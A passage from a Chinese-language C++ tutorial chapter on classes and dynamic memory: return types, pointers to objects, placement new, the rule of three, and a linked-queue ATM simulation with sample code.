错误！不能返回局部变量的引用 &#125;&#125;;int main() &#123; Store myStore; // ... 添加产品到 myStore ... const Product &amp; found = myStore.findProductById(1); // 高效，无复制 found.show(); // OK: 调用 const 方法 // found.setPrice(9.99); // 错误！不能通过 const 引用调用非 const 方法 return 0;&#125; 12.4.2 返回指向非 const 对象的引用语法: ClassName &amp; functionName(parameters); 何时使用:当函数需要返回一个已经存在的对象，并且允许调用者通过返回的引用修改这个对象时。最常见的例子是重载某些运算符，如 [] (下标) 或 += (复合赋值)。 优点: 高效: 同样避免了创建对象的副本。 允许修改: 可以用于实现链式调用或允许直接修改返回的对象。 缺点/注意事项: 不能返回局部对象的引用: 与返回 const 引用一样，绝对不能返回函数内部局部变量的引用。 破坏封装 (可能): 如果返回的是类内部私有成员的非 const 引用，可能会破坏类的封装性，允许外部代码直接修改内部状态，应谨慎使用。 示例:重载 String 类的下标运算符 []，允许修改字符。 123456789101112131415161718192021222324252627// 在 String 类中 (来自 string1.h)class String &#123; // ...public: // ... // 返回非 const 引用，允许修改 char &amp; operator[](int i); // 返回 const 引用，用于 const 对象 const char &amp; operator[](int i) const;&#125;;// 实现char &amp; String::operator[](int i) &#123; return str[i]; // 返回内部 char 数组元素的引用&#125;const char &amp; String::operator[](int i) const &#123; return str[i];&#125;// 使用String greeting(&quot;Hello&quot;);greeting[0] = &#x27;J&#x27;; // OK: 通过返回的引用修改了第一个字符cout &lt;&lt; greeting &lt;&lt; endl; // 输出 Jelloconst String constGreeting(&quot;Hi&quot;);char firstChar = constGreeting[0]; // OK: 读取字符// constGreeting[0] = &#x27;B&#x27;; // 错误！不能修改 const 对象 另一个例子是 operator+=，它修改对象自身并返回自身的引用以支持链式操作（虽然链式赋值不常见）。 12345// 在 Time 类中Time&amp; Time::operator+=(const Time&amp; t) &#123; // ... 实现加法逻辑，修改 *this ... return *this; // 返回调用对象自身的引用&#125; 12.4.3 返回对象 (按值返回)语法: ClassName functionName(parameters); 何时使用:当函数需要返回一个新创建的对象（在函数内部计算或构造得到），或者需要返回一个现有对象的副本而不是其本身时。这是最常见和最安全的返回对象的方式，特别是对于局部对象。 优点: 安全: 不会返回悬挂引用。返回的是一个独立的副本（或移动后的对象）。 简单: 易于理解和实现。 缺点/注意事项: 可能有效率开销: 传统上，按值返回会调用复制构造函数来创建返回值的副本，这可能涉及大量数据的复制和内存分配/释放，效率较低。 返回值优化 (RVO/NRVO): 现代 C++ 编译器通常会应用返回值优化 (Return Value Optimization, RVO) 或命名返回值优化 (Named Return Value Optimization, NRVO)**。这些优化可以完全避免**复制构造函数的调用，直接在调用者指定的内存位置上构造返回的对象，从而大大提高按值返回的效率。 移动语义 (C++11): 如果 RVO/NRVO 不适用，但类有移动构造函数，编译器可能会选择调用移动构造函数而不是复制构造函数来转移资源所有权，这也比深复制高效得多。 示例:重载 Vector 类的 + 运算符。 1234567891011121314151617181920212223// 在 Vector 类中class Vector &#123; // ...public: // ... // 按值返回一个新的 Vector 对象 Vector operator+(const Vector &amp; b) const;&#125;;// 实现Vector Vector::operator+(const Vector &amp; b) const &#123; // 方法 1: 创建命名对象并返回 (可能触发 NRVO) Vector sum(x + b.x, y + b.y); return sum; // 方法 2: 直接返回临时对象 (可能触发 RVO) // return Vector(x + b.x, y + b.y);&#125;// 使用Vector v1(1, 2), v2(3, 4);Vector v3 = v1 + v2; // v1 + v2 返回一个临时 Vector 对象 // 这个临时对象被用来初始化 v3 (可能通过 RVO/NRVO 或移动/复制构造) 由于 RVO/NRVO 和移动语义的存在，按值返回在现代 C++ 中通常是高效且推荐的方式，特别是对于那些表示“值”而非“身份”的类型。 12.4.4 返回 const 对象 (按值返回)语法: const ClassName functionName(parameters); 何时使用:这是一种不太常见的返回方式。它按值返回一个对象，但这个返回的临时对象是 const 的。 优点: 阻止对返回的临时对象调用非 const 方法: 如果一个函数按值返回一个对象，调用者可以立即对这个返回的临时对象调用其成员函数。如果返回类型是 const ClassName，则只能调用该对象的 const 成员函数。 缺点/注意事项: 通常意义不大: 对于类类型，将按值返回的对象声明为 const 通常没什么必要。因为返回的是一个临时对象（右值），对其进行修改通常没有意义，而且 C++11 的移动语义通常更关心对象是否是右值，而不是它是否 const。在某些情况下，返回 const 对象甚至可能阻止移动语义的应用，导致不必要的复制。 对于内置类型（如 int），返回 const int 几乎没有任何作用。 示例: 123456789101112const String getName() &#123; String temp = &quot;Temporary Name&quot;; return temp; // 返回 const String 对象&#125;int main() &#123; // getName()[0] = &#x27;X&#x27;; // 错误！不能对返回的 const 临时对象调用非 const 的 operator[] char first = getName()[0]; // OK: 调用 const 的 operator[] String nameCopy = getName(); // OK: const 临时对象可以用来初始化非 const 对象 (通过复制/移动构造) return 0;&#125; 总的来说，除非有非常特殊的原因需要阻止对返回的临时对象调用非 const 方法，否则通常不推荐按值返回 const 对象。直接按值返回非 const 对象通常更灵活，并且更能受益于 RVO 和移动语义。 总结: 返回引用 (&amp; 或 const &amp;): 高效，无复制。用于返回已存在的、生命周期足够长的对象。绝不能返回局部变量的引用。const &amp; 更安全，&amp; 允许修改。 按值返回 (ClassName): 安全，返回副本或移动后的对象。适用于返回函数内创建的新对象。效率通常由 RVO/NRVO 和移动语义保证。 按值返回 const 对象 (const ClassName): 不常用，可能阻止对临时对象的修改，但通常意义不大，甚至可能影响优化。 12.5 使用指向对象的指针就像可以使用指向内置类型（如 int*）或结构（如 MyStruct*）的指针一样，也可以声明和使用指向类对象的指针。指针本身存储的是对象的内存地址。 声明指向对象的指针: 1ClassName * pointerName; 例如，要声明一个指向 String 对象的指针： 123#include &quot;string1.h&quot; // 包含 String 类定义String * p_string; // 声明一个指向 String 对象的指针 12.5.1 再读 new 和 delete使用 new 运算符可以在自由存储区（堆）上动态地创建对象，并返回该对象的地址。这个地址可以存储在相应类型的指针中。 使用 new 创建对象: 12pointerName = new ClassName; // 调用默认构造函数pointerName = new ClassName(arguments); // 调用匹配参数的构造函数 当使用 new ClassName(...) 时，会发生两件事： 在自由存储区分配足够容纳 ClassName 对象的内存。 调用相应的构造函数来初始化这块内存中的对象。 示例: 123456789101112131415#include &quot;string1.h&quot;#include &lt;iostream&gt;int main() &#123; using std::cout; using std::endl; String * p1 = new String(&quot;Dynamically allocated string&quot;); // 调用 String(const char*) String * p2 = new String; // 调用默认构造函数 String() cout &lt;&lt; &quot;p1 points to: &quot; &lt;&lt; *p1 &lt;&lt; endl; // 使用 * 解引用指针访问对象 cout &lt;&lt; &quot;p2 points to: &quot; &lt;&lt; *p2 &lt;&lt; endl; // ... 使用 p1 和 p2 指向的对象 ...&#125; 使用 delete 销毁对象: 通过 new 创建的对象必须使用 delete 来销毁，以释放内存并执行清理工作。 1delete pointerName; 当使用 delete pointerName 时，会发生两件事： 调用 pointerName 指向的对象的析构函数 (~ClassName())。 释放该对象占用的内存。 示例 (续): 1234567891011121314// main.cpp (续)int main() &#123; // ... (创建 p1, p2 的代码) ... cout &lt;&lt; &quot;\\nDeleting objects...\\n&quot;; delete p1; // 调用 ~String() for *p1，然后释放内存 delete p2; // 调用 ~String() for *p2，然后释放内存 // p1 和 p2 现在是悬挂指针，不应再使用 p1 = nullptr; p2 = nullptr; return 0;&#125; 忘记 delete 通过 new 创建的对象会导致内存泄漏。 new[] 和 delete[] 用于对象数组: 同样可以动态分配对象数组。 123456int size = 5;String * favorites = new String[size]; // 调用 size 次默认构造函数// ... 使用数组 ...delete [] favorites; // 调用 size 次析构函数，然后释放整个数组内存 new ClassName[size] 会为数组中的每个元素调用默认构造函数。如果类没有默认构造函数，这种分配方式将失败。 必须使用 delete [] 来释放通过 new[] 分配的数组。使用 delete (不带 []) 会导致未定义行为（通常只调用第一个元素的析构函数，并可能导致内存损坏）。 12.5.2 指针和对象小结 声明: ClassName * ptr; 动态创建: ptr = new ClassName(args); (调用构造函数) 动态销毁: delete ptr; (调用析构函数) 访问成员: 解引用和点号: (*ptr).memberName 或 (*ptr).methodName(args) 箭头运算符 (常用): ptr-&gt;memberName 或 ptr-&gt;methodName(args)。箭头运算符 -&gt; 是专门为指向对象的指针访问其成员而设计的，它等价于先解引用再用点号访问。 示例 (使用箭头运算符): 123456789101112131415#include &quot;string1.h&quot;#include &lt;iostream&gt;int main() &#123; String * glamour = new String(&quot;Glamorous&quot;); // 使用箭头运算符访问成员 std::cout &lt;&lt; &quot;String: &quot; &lt;&lt; glamour-&gt;operator const char *() &lt;&lt; std::endl; // 假设有转换函数 std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; glamour-&gt;length() &lt;&lt; std::endl; // 调用 length() 方法 std::cout &lt;&lt; &quot;First char: &quot; &lt;&lt; (*glamour)[0] &lt;&lt; std::endl; // 混合使用 * 和 [] std::cout &lt;&lt; &quot;First char again: &quot; &lt;&lt; glamour-&gt;operator[](0) &lt;&lt; std::endl; // 使用 -&gt; 调用 operator[] delete glamour; return 0;&#125; 12.5.3 再读定位 new 运算符标准 new 在自由存储区（堆）上查找内存块。C++ 还允许通过另一种形式的 new——**定位 new (placement new)**——来指定分配对象的位置。 前提: 你需要提供一个指向已分配好的内存块的地址，并确保该内存块足够大以容纳要创建的对象。 语法: 123456#include &lt;new&gt; // 必须包含 &lt;new&gt; 头文件BufferType * buffer = /* ... 获取指向已分配内存的指针 ... */;ClassName * ptr;ptr = new (buffer) ClassName(arguments); // 在 buffer 指向的内存上构造对象 new (buffer): 这部分是定位 new 运算符。它不分配新内存，而是告诉编译器在 buffer 指向的地址处构造对象。 ClassName(arguments): 调用相应的构造函数来初始化 buffer 指向的内存区域。 何时使用定位 new? 内存池管理: 当你需要自己管理一块大的内存区域（内存池），并在其中反复创建和销毁对象时，可以避免频繁调用标准 new 和 delete 带来的开销和内存碎片。 特定硬件地址: 在某些嵌入式系统或底层编程中，可能需要在特定的硬件地址上创建对象。 优化: 在性能要求极高的场景下，如果能预先分配好内存，定位 new 可以省去标准 new 的内存查找开销。 销毁定位 new 创建的对象: 定位 new 只负责调用构造函数，它不负责内存管理。因此，你不能对通过定位 new 获取的指针使用标准的 delete。标准的 delete 会尝试释放内存，但这块内存不是由标准 new 分配的（或者你打算重用它）。 要销毁通过定位 new 创建的对象，你需要显式地调用该对象的析构函数： 1ptr-&gt;~ClassName(); // 显式调用析构函数 ptr-&gt;~ClassName(): 这是调用析构函数的语法。它执行对象的清理工作，但不释放内存。 内存的释放由管理 buffer 的代码负责（例如，如果 buffer 是一个大的 char 数组，它会在数组生命周期结束时自动释放；如果是通过标准 new 分配的，则需要对应的 delete []）。 示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;new&gt; // for placement new#include &quot;string1.h&quot; // 假设 String 类有默认和 C-string 构造函数及析构函数const int BUF = 512;char buffer[BUF]; // 预先分配的内存缓冲区 (静态存储)int main() &#123; using std::cout; using std::endl; String *p1, *p2; cout &lt;&lt; &quot;Block 1: placement new in buffer:\\n&quot;; p1 = new (buffer) String(&quot;Hello&quot;); // 在 buffer 开始处构造 String(&quot;Hello&quot;) // 计算 buffer 中下一个可用地址 // 注意：这只是一个简化示例，实际内存池管理需要更复杂的对齐和大小计算 size_t available_space = BUF - sizeof(String); void * next_loc = buffer + sizeof(String); if (available_space &gt;= sizeof(String)) &#123; p2 = new (next_loc) String(&quot;World&quot;); // 在 buffer 的下一个位置构造 String(&quot;World&quot;) &#125; else &#123; cout &lt;&lt; &quot;Not enough space for p2.\\n&quot;; p2 = nullptr; &#125; cout &lt;&lt; &quot;Memory addresses:\\n&quot; &lt;&lt; &quot;buffer: &quot; &lt;&lt; (void *) buffer &lt;&lt; &quot; p1: &quot; &lt;&lt; p1 &lt;&lt; &quot; p2: &quot; &lt;&lt; p2 &lt;&lt; endl; cout &lt;&lt; &quot;p1: &quot; &lt;&lt; *p1 &lt;&lt; endl; if (p2) cout &lt;&lt; &quot;p2: &quot; &lt;&lt; *p2 &lt;&lt; endl; // 显式销毁对象 (按构造相反顺序通常是好习惯) cout &lt;&lt; &quot;\\nDestroying objects:\\n&quot;; if (p2) &#123; p2-&gt;~String(); // 调用 p2 指向对象的析构函数 cout &lt;&lt; &quot;p2 destroyed.\\n&quot;; &#125; p1-&gt;~String(); // 调用 p1 指向对象的析构函数 cout &lt;&lt; &quot;p1 destroyed.\\n&quot;; // buffer 内存本身会在 main 结束时自动释放 (因为它是栈上的数组) cout &lt;&lt; &quot;\\nBlock 2: Standard new/delete:\\n&quot;; String * p3 = new String(&quot;Standard new&quot;); cout &lt;&lt; &quot;p3: &quot; &lt;&lt; *p3 &lt;&lt; &quot; at &quot; &lt;&lt; p3 &lt;&lt; endl; delete p3; // 使用标准 delete，它会调用析构函数并释放内存 cout &lt;&lt; &quot;p3 deleted.\\n&quot;; return 0;&#125; 总结: 指向对象的指针是管理动态创建对象的常用方式。 new ClassName(args) 分配内存并调用构造函数。 delete ptr 调用析构函数并释放内存。 new ClassName[size] 分配数组并调用默认构造函数。 delete [] ptr 调用数组元素的析构函数并释放内存。 使用 -&gt; 运算符通过指针访问对象成员。 定位 new (new (address) ClassName(args)) 在指定地址构造对象，不分配内存。 定位 new 创建的对象必须通过显式调用析构函数 (ptr-&gt;~ClassName()) 来销毁，内存需另外管理。 12.6 复习各种技术本章我们深入探讨了类如何与动态内存分配交互，以及为了正确管理资源和避免错误所必须采用的技术。本节将简要回顾其中几个关键技术点。 12.6.1 重载 &lt;&lt; 运算符为了方便地输出对象的状态，我们经常为自定义类重载输出运算符 &lt;&lt;。 实现方式: 通常实现为非成员友元函数。 非成员: 因为左操作数是 std::ostream 对象（如 cout），而不是我们自定义类的对象。调用形式是 operator&lt;&lt;(cout, myObject)。 友元: 因为它通常需要访问类的 private 数据成员来获取要输出的信息。 函数签名: friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const ClassName &amp; obj); 第一个参数是 ostream 对象的引用。 第二个参数通常是待输出对象的 const 引用（因为输出操作不应修改对象）。 返回 ostream 对象的引用，以支持链式输出（cout &lt;&lt; obj1 &lt;&lt; obj2;）。 实现: 函数内部访问对象的成员，并将它们格式化输出到传入的 ostream 对象 os 中。 示例 (回顾 String 类): 12345678910111213141516// string1.h excerptclass String &#123; // ... private: char * str; int len; ... friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const String &amp; st); // ...&#125;;// string1.cpp excerptstd::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const String &amp; st) &#123; os &lt;&lt; st.str; // 友元函数访问私有成员 str return os;&#125;// 使用String greeting(&quot;Hello&quot;);std::cout &lt;&lt; &quot;Message: &quot; &lt;&lt; greeting &lt;&lt; std::endl; // 调用 operator&lt;&lt;(cout, greeting) 12.6.2 转换函数转换函数允许类对象被隐式或显式地转换为其他类型。 语法: operator typeName() const; 必须是成员函数。 没有声明返回类型。 通常没有参数。 通常声明为 const，因为转换操作不应修改对象状态。 功能: 定义了从当前类类型到 typeName 类型的转换规则。 explicit (C++11): 可以使用 explicit 关键字阻止隐式转换，只允许显式转换（如 static_cast）。这有助于避免意外转换和二义性。 示例 (回顾 Stones 类): 1234567891011121314151617181920212223// stones.h excerptclass Stones &#123; // ... private: double pounds; ...public: // ... explicit operator double() const; // 显式转换为 double explicit operator int() const; // 显式转换为 int&#125;;// stones.cpp excerptStones::operator double() const &#123; return pounds;&#125;Stones::operator int() const &#123; return int(pounds + 0.5); // 四舍五入&#125;// 使用Stones stone_obj(100.7);// double weight = stone_obj; // 错误！因为是 explicitdouble weight = static_cast&lt;double&gt;(stone_obj); // OK: 显式转换int int_weight = static_cast&lt;int&gt;(stone_obj); // OK: 显式转换std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; 注意事项: 谨慎使用隐式转换函数，它们可能导致代码行为难以预测或产生二义性。优先使用 explicit。 避免提供相互冲突或模糊的转换路径。 12.6.3 其构造函数使用 new 的类这是本章的核心内容。当类的构造函数使用 new 来分配动态内存，并且类负责管理这块内存（即在析构函数中使用 delete）时，必须特别注意对象的复制和赋值行为。 问题: 编译器生成的默认复制构造函数和默认赋值运算符执行浅复制（只复制指针地址），导致： 多个对象指向同一块内存。 析构时发生**重复删除 (double deletion)**。 赋值时可能发生内存泄漏（旧内存未释放）。 解决方案 (三/五法则):必须提供自定义的特殊成员函数来执行深复制并正确管理内存： 析构函数 (~ClassName()): 必须定义。 负责使用 delete 或 delete[] 释放构造函数中通过 new 分配的所有内存。 复制构造函数 (ClassName(const ClassName &amp;)): 必须定义。 为新对象分配自己的内存。 将源对象的数据复制到新分配的内存中。 复制赋值运算符 (ClassName &amp; operator=(const ClassName &amp;)): 必须定义。 检查自我赋值 (if (this == &amp;other) return *this;)。 释放当前对象 (*this) 的旧内存。 为当前对象分配新的内存。 将源对象的数据复制到新分配的内存中。 返回对当前对象 (*this) 的引用。 示例 (回顾 String 类关键部分): 12345678910111213141516171819202122232425262728293031323334353637// string1.h excerptclass String &#123;private: char * str; int len; // ...public: String(const char * s); // Constructor using new String(const String &amp; st); // Copy constructor (deep copy) ~String(); // Destructor using delete[] String &amp; operator=(const String &amp; st); // Assignment operator (deep copy) String &amp; operator=(const char * s); // Another assignment overload // ...&#125;;// string1.cpp excerpt (实现深复制)String::String(const String &amp; st) &#123; // Copy Constructor len = st.len; str = new char [len + 1]; std::strcpy(str, st.str); // ... (update static count etc.)&#125;String::~String() &#123; // Destructor delete [] str; // ... (update static count etc.)&#125;String &amp; String::operator=(const String &amp; st) &#123; // Assignment Operator if (this == &amp;st) return *this; delete [] str; // Free old string len = st.len; str = new char [len + 1]; std::strcpy(str, st.str); return *this;&#125; 现代 C++ (零法则):如果可能，尽量避免手动管理原始指针和 new/delete。使用标准库提供的容器（如 std::string, std::vector）和智能指针（如 std::unique_ptr, std::shared_ptr）。这些类已经内置了正确的资源管理和复制/移动语义，遵循 RAII 原则。如果你的类只包含这类成员，通常就不需要编写自定义的析构函数、复制/移动构造函数或赋值运算符，编译器生成的默认版本就能正确工作（零法则）。 掌握这些技术对于编写安全、健壮且能正确处理动态内存的 C++ 类至关重要。 12.7 队列模拟本章我们学习了类和动态内存分配，现在我们将这些知识应用于一个实际问题：模拟银行 ATM 的客户队列。通过模拟，我们可以分析不同条件下（如不同的客户到达率、不同的队列最大长度）客户的平均等待时间，帮助银行做出决策。 模拟场景: 有一个 ATM 机。 客户随机到达，平均每小时到达一定数量的客户。 客户到达后，如果 ATM 空闲且队列为空，则直接使用 ATM。 如果 ATM 繁忙或队列非空，客户进入队列等待。 队列有最大长度限制，如果客户到达时队列已满，则客户离开（被拒绝服务）。 每个客户的交易时间是随机的（在某个范围内）。 我们想模拟一段时间（例如 100 小时），然后统计：服务的总客户数、被拒绝的总客户数、平均队列长度、平均客户等待时间。 实现思路: 为了实现这个模拟，我们需要两个主要的类： Customer 类: 用于表示一个客户。它需要存储客户的关键信息： 到达时间 (Arrival Time): 客户何时加入队列。 交易所需时间 (Processing Time): 客户在 ATM 上需要花费多长时间。 Queue 类: 用于表示等待队列。这是一个典型的先进先出 (FIFO - First-In, First-Out) 数据结构。我们需要能够： 将客户添加到队尾 (enqueue)。 从队首移除客户 (dequeue)。 检查队列是否为空 (is_empty)。 检查队列是否已满 (is_full)。 获取当前队列中的客户数量 (queue_count)。 由于队列的长度可能在运行时变化（客户加入和离开），并且我们可能需要处理潜在的大量客户，使用动态内存分配来实现 Queue 类是合适的。我们将使用**链式队列 (Linked Queue)**，其中每个节点包含一个 Customer 对象和一个指向下一个节点的指针。 12.7.1 队列类 (Queue Class)设计要点: 节点结构 (Node): 在 Queue 类内部定义一个私有的 Node 结构（或类），包含一个 Customer 对象（项目）和一个指向下一个 Node 的指针。 数据成员: front: 指向队首节点的指针。 rear: 指向队尾节点的指针。 items: 当前队列中的项目数（客户数）。 qsize: 队列的最大容量（构造时指定）。 特殊成员函数 (处理动态内存): 构造函数: 初始化队列为空，设置最大容量。 析构函数: 释放所有节点占用的内存，防止内存泄漏。 复制构造函数: 实现深复制，创建一个完全独立的队列副本（如果需要复制队列）。 赋值运算符: 实现深复制赋值，处理自我赋值和内存管理。 (注意：对于这个模拟，我们可能不需要复制或赋值队列，可以考虑禁用它们或使用默认行为，但完整的类设计应考虑这些) 公有成员函数 (队列操作): bool isempty() const; bool isfull() const; int queuecount() const; bool enqueue(const Customer &amp;item); // 添加客户到队尾 bool dequeue(Customer &amp;item); // 从队首移除客户，并通过引用参数返回 queue.h (Queue 类定义) 1234567891011121314151617181920212223242526272829303132333435363738394041424344#ifndef QUEUE_H_#define QUEUE_H_// 前向声明 Customer 类class Customer;// 为了简化，我们直接使用 Customer 类型，而不是模板typedef Customer Item;class Queue &#123;private: // 内部节点结构 struct Node &#123; Item item; // 存储的数据 (Customer 对象) Node * next; // 指向下一个节点的指针 &#125;; enum &#123; Q_SIZE = 10 &#125;; // 默认队列大小 (可以修改) Node * front; // 指向队首的指针 Node * rear; // 指向队尾的指针 int items; // 当前队列中的项目数 const int qsize; // 队列最大容量 (const 成员) // 复制构造函数和赋值运算符设为私有，以禁止复制 (简单处理方式) // 如果需要复制，则需要实现深复制 Queue(const Queue &amp; q) : qsize(0) &#123; &#125; Queue &amp; operator=(const Queue &amp; q) &#123; return *this; &#125;public: // 构造函数，可以指定最大容量 Queue(int qs = Q_SIZE); // 析构函数 ~Queue(); bool isempty() const &#123; return items == 0; &#125; bool isfull() const &#123; return items == qsize; &#125; int queuecount() const &#123; return items; &#125; // 添加项目到队尾 bool enqueue(const Item &amp;item); // 从队首移除项目 bool dequeue(Item &amp;item); // item 用于接收出队的数据&#125;;#endif // QUEUE_H_ queue.cpp (Queue 类实现) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &quot;queue.h&quot;#include &lt;cstdlib&gt; // for std::rand() - 仅用于 Customer 示例，Queue 本身不需要// --- Customer 类定义 (简单版本，放在这里仅为编译 Queue) ---// 实际应用中应放在单独的 customer.h/cppclass Customer &#123;private: long arrive; // arrival time for customer int processtime; // processing time for customerpublic: Customer() : arrive(0), processtime(0) &#123;&#125; // default constructor void set(long when) &#123; processtime = std::rand() % 3 + 1; // 随机处理时间 1-3 分钟 arrive = when; &#125; long when() const &#123; return arrive; &#125; int ptime() const &#123; return processtime; &#125;&#125;;// --- Customer 类定义结束 ---// Queue 方法实现Queue::Queue(int qs) : qsize(qs) &#123; // 初始化 const 成员 qsize front = rear = nullptr; // 初始化为空队列 items = 0;&#125;Queue::~Queue() &#123; Node * temp; while (front != nullptr) &#123; // 循环直到队列为空 temp = front; // 保存当前队首节点地址 front = front-&gt;next; // 移动 front 指向下一个节点 delete temp; // 删除旧的队首节点 &#125;&#125;// 添加项目到队尾bool Queue::enqueue(const Item &amp;item) &#123; if (isfull()) return false; // 队列已满，无法添加 Node * add = new Node; // 创建新节点 // 如果 new 失败，会抛出异常 (这里简化处理，未捕获) add-&gt;item = item; // 设置节点数据 add-&gt;next = nullptr; // 新节点是队尾，next 为空 items++; // 项目数增加 if (front == nullptr) // 如果队列原本为空 front = add; // 新节点同时是队首和队尾 else rear-&gt;next = add; // 将原队尾节点的 next 指向新节点 rear = add; // 更新 rear 指向新的队尾节点 return true;&#125;// 从队首移除项目bool Queue::dequeue(Item &amp;item) &#123; if (isempty()) return false; // 队列为空，无法移除 item = front-&gt;item; // 获取队首节点的数据 (通过引用参数返回) items--; // 项目数减少 Node * temp = front; // 保存队首节点地址 front = front-&gt;next; // 移动 front 指向下一个节点 delete temp; // 删除旧的队首节点 if (items == 0) // 如果删除后队列为空 rear = nullptr; // rear 也设为空 return true;&#125; 12.7.2 Customer 类这个类相对简单，只需要存储客户的到达时间和所需的交易时间。 123456789101112131415161718192021222324// customer.h (理想情况下)#ifndef CUSTOMER_H_#define CUSTOMER_H_class Customer &#123;private: long arrive; // arrival time for customer int processtime; // processing time for customerpublic: Customer() : arrive(0), processtime(0) &#123;&#125; void set(long when); // 设置到达时间，并随机生成处理时间 long when() const &#123; return arrive; &#125; int ptime() const &#123; return processtime; &#125;&#125;;#endif // CUSTOMER_H_// customer.cpp (理想情况下)#include &quot;customer.h&quot;#include &lt;cstdlib&gt; // for std::rand()void Customer::set(long when) &#123; processtime = std::rand() % 3 + 1; // 假设处理时间为 1, 2, 或 3 分钟 arrive = when;&#125; (在上面的 queue.cpp 中，我们为了方便编译，将 Customer 的简单定义直接放在了那里。在实际项目中，应将其分为 .h 和 .cpp 文件。) 12.7.3 ATM 模拟 (atm.cpp)现在我们可以编写主程序来执行模拟了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for rand() and srand()#include &lt;ctime&gt; // for time()#include &quot;queue.h&quot; // 包含 Queue 类 (它内部包含了 Customer 的简单定义)const int MIN_PER_HR = 60; // 每小时分钟数// 函数：判断是否有新客户到来// 参数 x: 平均多少分钟来一位客户// 返回值: true 如果这一分钟有客户来, false 如果没有bool newcustomer(double x);int main() &#123; using std::cin; using std::cout; using std::endl; using std::ios_base; // 设置随机数种子 std::srand(std::time(0)); cout &lt;&lt; &quot;Case Study: Bank of Heather Automatic Teller\\n&quot;; cout &lt;&lt; &quot;Enter maximum size of queue: &quot;; int qs; // 队列最大长度 cin &gt;&gt; qs; Queue line(qs); // 创建队列对象 cout &lt;&lt; &quot;Enter the number of simulation hours: &quot;; int hours; // 模拟总小时数 cin &gt;&gt; hours; // 模拟以分钟为单位进行 long cyclelimit = MIN_PER_HR * hours; // 总模拟分钟数 cout &lt;&lt; &quot;Enter the average number of customers per hour: &quot;; double perhour; // 平均每小时客户数 cin &gt;&gt; perhour; double min_per_cust; // 平均多少分钟来一位客户 min_per_cust = MIN_PER_HR / perhour; Item temp; // 用于存储新客户 long turnaways = 0; // 因队列满而被拒绝的客户数 long customers = 0; // 加入队列的总客户数 long served = 0; // 完成服务的总客户数 long sum_line = 0; // 累计的队列长度 (用于计算平均长度) int wait_time = 0; // 当前客户在 ATM 处还需等待的时间 long line_wait = 0; // 所有客户累计的总等待时间 (队列中 + ATM处) // --- 模拟主循环 --- for (long cycle = 0; cycle &lt; cyclelimit; cycle++) &#123; // 1. 是否有新客户到来？ if (newcustomer(min_per_cust)) &#123; if (line.isfull()) &#123; turnaways++; // 队列满，拒绝 &#125; else &#123; customers++; // 客户加入 temp.set(cycle); // 设置客户到达时间 (当前分钟数) 和随机处理时间 line.enqueue(temp); // 加入队列 &#125; &#125; // 2. ATM 是否空闲？如果空闲且队列有人，则服务下一位 if (wait_time &lt;= 0 &amp;&amp; !line.isempty()) &#123; line.dequeue(temp); // 从队列取出客户 wait_time = temp.ptime(); // 设置 ATM 需等待时间 = 客户处理时间 line_wait += cycle - temp.when(); // 累加客户等待时间 (当前时间 - 到达时间) served++; // 服务客户数增加 &#125; // 3. 如果 ATM 正在服务，则减少剩余等待时间 if (wait_time &gt; 0) wait_time--; // 4. 累加当前队列长度 sum_line += line.queuecount(); &#125; // --- 模拟循环结束 --- // --- 输出模拟结果 --- if (customers &gt; 0) &#123; cout &lt;&lt; &quot;\\nCustomers accepted: &quot; &lt;&lt; customers &lt;&lt; endl; cout &lt;&lt; &quot; Customers served: &quot; &lt;&lt; served &lt;&lt; endl; cout &lt;&lt; &quot; Turnaways: &quot; &lt;&lt; turnaways &lt;&lt; endl; cout &lt;&lt; &quot;Average queue size: &quot;; cout.precision(2); cout.setf(ios_base::fixed, ios_base::floatfield); cout &lt;&lt; (double) sum_line / cyclelimit &lt;&lt; endl; // 平均队列长度 cout &lt;&lt; &quot; Average wait time: &quot; &lt;&lt; (double) line_wait / served &lt;&lt; &quot; minutes\\n&quot;; // 平均等待时间 &#125; else &#123; cout &lt;&lt; &quot;No customers!\\n&quot;; &#125; cout &lt;&lt; &quot;Done!\\n&quot;; return 0;&#125;// 函数定义：判断是否有新客户到来// 这是一个简单的概率模型：在一分钟内，客户到来的概率是 1/xbool newcustomer(double x) &#123; // rand() * x / RAND_MAX &lt; 1 等价于 rand() / RAND_MAX &lt; 1/x return (std::rand() * x / RAND_MAX &lt; 1);&#125; 编译和运行: 你需要将 queue.cpp 和 atm.cpp 一起编译链接。 12g++ atm.cpp queue.cpp -o atm./atm 程序会提示你输入队列最大长度、模拟小时数和平均每小时客户数，然后运行模拟并输出结果。你可以尝试不同的输入值，观察它们对平均等待时间和队列长度的影响。这个模拟虽然简单，但它展示了如何使用类（特别是涉及动态内存的类）来解决实际问题。 12.8 总结本章深入探讨了当 C++ 类需要直接管理动态分配的内存（使用 new 和 delete）时所面临的挑战和必需的技术。核心问题在于编译器自动生成的默认成员函数（特别是复制构造函数和赋值运算符）执行的浅复制行为，这对于包含原始指针成员的类来说是危险的。 主要内容回顾： 动态内存和类的问题: 如果类使用 new 分配内存并存储在指针成员中，默认的复制构造函数和赋值运算符只会复制指针的地址（浅复制），而不是指针指向的数据。 浅复制导致多个对象共享同一块动态内存，当其中一个对象被销毁并调用析构函数 delete 内存时，其他对象的指针就变成了悬挂指针。 后续对悬挂指针的访问或在其他对象析构时再次 delete 同一块内存（重复删除）会导致未定义行为和程序崩溃。 默认赋值运算符还可能导致内存泄漏，因为它覆盖了旧指针而没有释放其指向的内存。 特殊成员函数和复制控制 (Rule of Three/Five): 为了解决浅复制问题，管理动态内存的类通常需要提供自定义的特殊成员函数： 析构函数 (~ClassName()): 必须定义，负责使用 delete 或 delete[] 释放由构造函数分配的所有动态内存。 复制构造函数 (ClassName(const ClassName &amp;)): 必须定义，执行深复制——为新对象分配独立的内存，并将源对象的数据复制到新内存中。 复制赋值运算符 (ClassName &amp; operator=(const ClassName &amp;)): 必须定义，执行深复制，同时需要处理自我赋值（obj = obj;）并释放旧资源，最后返回 *this。 三法则 